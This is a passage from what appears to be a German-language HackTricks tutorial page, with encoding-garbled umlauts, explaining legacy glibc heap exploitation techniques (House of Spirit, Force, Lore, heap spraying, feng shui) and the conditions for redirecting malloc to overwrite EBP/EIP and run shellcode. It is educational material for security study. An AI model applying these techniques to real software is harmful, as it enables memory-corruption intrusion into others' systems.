Wenn wir die Gr√∂√üe so √§ndern, dass sie 16 anstelle von 8 betr√§gt, dann wird fastbin\_index() fastbins\[0] zur√ºckgeben und wir k√∂nnen dies nutzen, um den Stack zu √ºberschreiben.

Daf√ºr d√ºrfen auf dem Stack kein Canary oder seltsame Werte vorhanden sein, tats√§chlich m√ºssen wir uns hier befinden: 4 Nullbytes + EBP + RET

Die 4 Nullbytes sind erforderlich, damit der **av** auf diese Adresse zeigt und das erste Element eines **av** ist das Mutex, das den Wert 0 haben muss.

Der **av->max\_fast** wird das EBP sein und ein Wert, der uns helfen wird, die Einschr√§nkungen zu umgehen.

In **av->fastbins\[0]** wird die Adresse von **p** √ºberschrieben und wird das RET sein, so dass der Shellcode ausgef√ºhrt wird.

Au√üerdem wird in **av->system\_mem** (1484 Bytes √ºber der Position auf dem Stack) gen√ºgend M√ºll vorhanden sein, der es uns erm√∂glicht, die √úberpr√ºfung zu umgehen.

Au√üerdem muss der benachbarte Chunk des freigegebenen Chunks gr√∂√üer als 8 sein -> Da wir gesagt haben, dass die Gr√∂√üe des freigegebenen Chunks 16 betr√§gt, m√ºssen wir in diesem falschen Chunk nur eine Gr√∂√üe gr√∂√üer als 8 setzen (da die Shellcode im freigegebenen Chunk sein wird, muss am Anfang ein jmp stehen, der auf nops zeigt, die nach dem size-Feld des neuen falschen Chunks stehen).

**The House of Spirit**

In diesem Fall m√∂chten wir einen Zeiger auf ein malloc haben, der vom Angreifer ver√§nderbar ist (z. B. dass der Zeiger im Stack unter einem m√∂glichen √úberlauf zu einer Variablen liegt).

So k√∂nnten wir diesen Zeiger auf beliebige Ziele zeigen lassen. Nicht jeder Ort ist jedoch geeignet, die Gr√∂√üe des gef√§lschten Chunks muss kleiner als av->max\_fast und genauer gesagt gleich der angeforderten Gr√∂√üe bei einem zuk√ºnftigen Aufruf von malloc()+8 sein. Daher, wenn wir wissen, dass nach diesem verwundbaren Zeiger ein malloc(40) aufgerufen wird, muss die Gr√∂√üe des gef√§lschten Chunks 48 betragen.

Wenn das Programm beispielsweise den Benutzer nach einer Zahl fragt, k√∂nnten wir 48 eingeben und den ver√§nderbaren malloc-Zeiger auf die n√§chsten 4 Bytes zeigen lassen (die m√∂glicherweise zum EBP geh√∂ren, sodass die 48 dahinter bleiben, als ob es die Kopfgr√∂√üe w√§re). Au√üerdem muss die Adresse ptr-4+48 mehrere Bedingungen erf√ºllen (in diesem Fall ist ptr=EBP), d. h. 8 < ptr-4+48 < av->system\_mem.

Wenn dies zutrifft, wird beim n√§chsten malloc-Aufruf, den wir als malloc(40) angegeben haben, die Adresse auf den EBP gesetzt. Wenn der Angreifer auch kontrollieren kann, was in diesem malloc geschrieben wird, kann er sowohl den EBP als auch den EIP mit der gew√ºnschten Adresse √ºberschreiben.

Ich denke, das liegt daran, dass wenn es freigegeben wird, free() speichert, dass an der Adresse, auf die der EBP auf dem Stack zeigt, ein Chunk mit der perfekten Gr√∂√üe f√ºr das neue malloc() gespeichert ist, und weist diesem die Adresse zu.

**The House of Force**

Es wird ben√∂tigt:

* Ein √úberlauf zu einem Chunk, der es erm√∂glicht, den wilderness zu √ºberschreiben
* Ein Aufruf von malloc() mit der vom Benutzer definierten Gr√∂√üe
* Ein Aufruf von malloc(), dessen Daten vom Benutzer definiert werden k√∂nnen

Zuerst wird die Gr√∂√üe des wilderness-Chunks mit einem sehr gro√üen Wert (0xffffffff) √ºberschrieben, sodass jede ausreichend gro√üe Speicheranforderung in \_int\_malloc() behandelt wird, ohne den Heap erweitern zu m√ºssen.

Zweitens wird av->top ge√§ndert, damit es auf einen vom Angreifer kontrollierten Speicherbereich zeigt, wie den Stack. In av->top wird \&EIP - 8 platziert.

Wir m√ºssen av->top √ºberschreiben, damit es auf den vom Angreifer kontrollierten Speicherbereich zeigt:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim erh√§lt den Wert der Adresse des aktuellen wilderness-Chunks (des aktuellen av->top) und remainder ist genau die Summe dieser Adresse plus der Anzahl der Bytes, die von malloc() angefordert wurden. Wenn also \&EIP-8 bei 0xbffff224 liegt und av->top 0x080c2788 enth√§lt, dann ist die Menge, die im kontrollierten malloc reserviert werden muss, damit av->top auf $EIP-8 f√ºr das n√§chste malloc() zeigt:

0xbffff224 - 0x080c2788 = 3086207644.

So wird der ge√§nderte Wert in av->top gespeichert und das n√§chste malloc zeigt auf den EIP und kann √ºberschrieben werden.

Es ist wichtig zu wissen, dass die Gr√∂√üe des neuen wilderness-Chunks gr√∂√üer sein muss als die Anforderung des letzten malloc(). Das bedeutet, wenn das wilderness auf \&EIP-8 zeigt, wird die Gr√∂√üe genau im EBP-Feld des Stacks liegen.

**The House of Lore**

**SmallBin-Korruption**

Die freigegebenen Chunks werden je nach ihrer Gr√∂√üe in den Bin eingef√ºgt. Bevor sie eingef√ºgt werden, werden sie jedoch in unsorted bins gespeichert. Ein Chunk wird nicht sofort in seinen Bin eingef√ºgt, sondern bleibt in unsorted bins. Wenn ein neuer Chunk reserviert wird und der zuvor freigegebene Chunk verwendet werden kann, wird er zur√ºckgegeben, aber wenn ein gr√∂√üerer Chunk reserviert wird, wird der freigegebene Chunk in den entsprechenden Bin verschoben.

Um den anf√§lligen Code zu erreichen, muss die Speicheranforderung gr√∂√üer als av->max\_fast (normalerweise 72) und kleiner als MIN\_LARGE\_SIZE (512) sein.

Wenn im Bin ein Chunk mit der richtigen Gr√∂√üe vorhanden ist, wird dieser nach dem Entfernen zur√ºckgegeben:

bck = victim->bk; Zeigt auf den vorherigen Chunk, dies ist die einzige Information, die wir √§ndern k√∂nnen.

bin->bk = bck; Der vorletzte Chunk wird zum letzten, wenn bck auf den Stack zeigt, wird dem n√§chsten reservierten Chunk diese Adresse zugewiesen.

bck->fd = bin; Die Liste wird geschlossen, indem sie auf bin zeigt.

Es wird ben√∂tigt:
Reservieren Sie zwei mallocs, so dass der erste nach der Freigabe des zweiten √ºberlaufen werden kann, nachdem er in seinen Bin eingef√ºgt wurde (dh ein malloc gr√∂√üer als der zweite Abschnitt reserviert wurde, bevor der √úberlauf stattfindet).

Der vom Angreifer gew√§hlte Speicherbereich, der vom reservierten malloc kontrolliert wird.

Das Ziel ist es, wenn wir einen Heap √ºberlaufen k√∂nnen, der darunter einen bereits freigegebenen Abschnitt mit seinem Bin hat, k√∂nnen wir seinen bk-Pointer √§ndern. Wenn wir seinen bk-Pointer √§ndern und dieser Abschnitt der erste in der Bin-Liste wird und reserviert wird, wird die Bin get√§uscht und glaubt, dass der n√§chste Abschnitt in der falschen Adresse liegt, die wir angegeben haben (zum Beispiel im Stack oder in der GOT). Wenn also ein weiterer Abschnitt reserviert wird und der Angreifer Berechtigungen daf√ºr hat, wird ihm ein Abschnitt an der gew√ºnschten Position gegeben und er kann darauf schreiben.

Nachdem der modifizierte Abschnitt freigegeben wurde, muss ein gr√∂√üerer Abschnitt als der freigegebene reserviert werden, damit der modifizierte Abschnitt aus den unsortierten Bins entfernt und in seinen Bin eingef√ºgt wird.

Sobald er in seinem Bin ist, ist es an der Zeit, seinen bk-Pointer durch den √úberlauf zu √§ndern, damit er auf die gew√ºnschte Adresse zeigt.

Daher muss der Bin warten, bis malloc() ausreichend oft aufgerufen wird, damit der modifizierte Bin erneut verwendet wird und die Bin t√§uscht, indem sie glaubt, dass der n√§chste Abschnitt in der falschen Adresse liegt. Dann wird der gew√ºnschte Abschnitt gegeben.

Um die Schwachstelle so schnell wie m√∂glich auszunutzen, w√§re ideal: Reservierung des anf√§lligen Abschnitts, Reservierung des Abschnitts, der ge√§ndert wird, Freigabe dieses Abschnitts, Reservierung eines gr√∂√üeren Abschnitts als des zu √§ndernden, √Ñnderung des Abschnitts (Schwachstelle), Reservierung eines Abschnitts derselben Gr√∂√üe wie der verwundbare Abschnitt und Reservierung eines zweiten Abschnitts derselben Gr√∂√üe, der auf die gew√§hlte Adresse zeigt.

Zum Schutz vor diesem Angriff wird die typische √úberpr√ºfung verwendet, dass der Abschnitt "nicht" falsch ist: Es wird √ºberpr√ºft, ob bck->fd auf victim zeigt. Das hei√üt, in unserem Fall, ob der fd-Pointer des falschen Abschnitts, der im Stack angezeigt wird, auf victim zeigt. Um diesen Schutz zu umgehen, m√ºsste der Angreifer auf irgendeine Weise (wahrscheinlich √ºber den Stack) in der Lage sein, die Adresse von victim an die richtige Adresse zu schreiben. Damit es wie ein echter Abschnitt aussieht.

**Korruption LargeBin**

Die gleichen Anforderungen wie zuvor sind erforderlich und einige mehr, au√üerdem m√ºssen die reservierten Abschnitte gr√∂√üer als 512 sein.

Der Angriff ist wie zuvor, dh der bk-Pointer muss ge√§ndert werden und all diese malloc()-Aufrufe sind erforderlich, aber zus√§tzlich muss die Gr√∂√üe des modifizierten Abschnitts so ge√§ndert werden, dass diese Gr√∂√üe - nb < MINSIZE ist.

Zum Beispiel muss die Gr√∂√üe auf 1552 gesetzt werden, damit 1552 - 1544 = 8 < MINSIZE (die Subtraktion kann nicht negativ sein, da ein unsigned-Wert verglichen wird).

Au√üerdem wurde ein Patch eingef√ºhrt, um es noch komplizierter zu machen.

**Heap Spraying**

Es besteht im Wesentlichen darin, so viel Speicher wie m√∂glich f√ºr Heaps zu reservieren und diese mit einer Schicht von Nops gefolgt von einer Shellcode zu f√ºllen. Au√üerdem wird 0x0c als Polster verwendet. Es wird versucht, zur Adresse 0x0c0c0c0c zu springen, und wenn also eine Adresse √ºberschrieben wird, die mit diesem Polster aufgerufen wird, wird dorthin gesprungen. Im Wesentlichen besteht die Taktik darin, so viel wie m√∂glich zu reservieren, um zu sehen, ob ein Pointer √ºberschrieben wird, und zu 0x0c0c0c0c zu springen, in der Hoffnung, dass dort Nops vorhanden sind.

**Heap Feng Shui**

Es besteht darin, durch Reservierungen und Freigaben den Speicher so zu strukturieren, dass reservierte Abschnitte zwischen freien Abschnitten verbleiben. Der zu √ºberlaufende Puffer wird in einem der freien Abschnitte platziert.

## Interessante Kurse

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referenzen**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen** oder **HackTricks als PDF herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
